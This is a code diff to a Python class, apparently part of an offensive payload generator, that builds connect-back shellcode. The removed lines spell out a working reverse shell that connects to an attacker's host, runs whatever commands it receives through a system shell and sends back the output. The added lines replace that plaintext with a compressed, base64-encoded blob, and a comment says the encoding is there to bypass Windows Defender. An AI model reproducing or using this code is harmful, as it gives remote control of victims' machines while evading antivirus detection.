@@ -1,3 +1,5 @@
+import zlib
+import base64
 from .base import ShellCode
 
 
@@ -7,7 +9,8 @@ class PythonShellCode(ShellCode):
     """
 
     def __init__(self, connect_back_ip='localhost', connect_back_port=5555):
-        ShellCode.__init__(self, connect_back_ip=connect_back_ip, connect_back_port=connect_back_port)
+        ShellCode.__init__(self, connect_back_ip=connect_back_ip,
+                           connect_back_port=connect_back_port)
 
     def get_python_code(self, bad_chars):
         """
@@ -18,34 +21,23 @@ class PythonShellCode(ShellCode):
             print("Settings for connect back listener must be defined")
             return False
 
-        python_code = """
-        #!/usr/bin/python
-        import socket,subprocess
-        HOST = '{{LOCALHOST}}'    # The remote host
-        PORT = {{LOCALPORT}}      # The same port as used by the server
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # connect to attacker machine
-        s.connect((HOST, PORT))
-        # send we are connected
-        s.send('[*] Connection Established!')
-        # start loop
-        while 1:
-            # recieve shell command
-            data = s.recv(1024)
-            print data
-            # if its quit, then break out and close socket
-            if data == 'quit' or data == 'q':
-                break
-            # do shell command
-            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            # read output
-            stdout_value = proc.stdout.read() + proc.stderr.read()
-            # send output to attacker
-            s.send(stdout_value)
-        # close socket
-        s.close()
-        """
-
+        # compress and base64 encode to bypass windows defender
+        python_code = (
+            b'eJxtUsFu2zAMvfsrWORgezOctdhpQA5BkGHFuiZofBuGQLY4'
+            b'WKgteZKcoijy7yUlNzOK6mLz8fHpkeLiajk6u6yVXg7PvjU6'
+            b'Uf1grAdnmkf0hRvrwZoGnUt+7A4VrCB9ebnbbdZ3HJ7PKdBZ'
+            b'QNUiWOyNR2iN88l+98DcicrR+Qzwn+tEjxDuEQ5GhxLqZ/Cc'
+            b'QHtCmzgqjg7K+MmmaP39eHu/rYq37GG3+Xk8VA/b9a88WUBj'
+            b'tMbGgzcgvBdEsdCLplUaE1dO2Sxj7wWwrZyrHGoJTwjC4psC'
+            b'SuIznqW/P/2BTUSV0bB1XtSdci3KqzRUe0F9dMYMyVOrOoTr'
+            b'b0ns1GKj8ERNtdh1pNz3QsuQk8ILbrEkyim7/nLzNQ/4YJX2'
+            b'ITtJqL+gvIN/o/IFD0hDbVE8ghlpdOS66YzDaRihhAqiOL0U'
+            b'V6Vg7AxJozc+QWi6RpoPTPLDs8nLCpR7M6DOWK2I/FVlR6R/'
+            b'L8nQas683W8DjtZ+iCv9Hs4vUxOS+xvG2FEUP55ENyLZ4ZIy'
+            b'YiVTsxw+X0C6bQInsfC0UWy+FFE4PvBcP+zQfKS0NByS3itr'
+            b'QQTj'
+        )
+        python_code = zlib.decompress(base64.b64decode(python_code)).decode()
         python_code = self.format_shellcode(python_code)
         return python_code
 
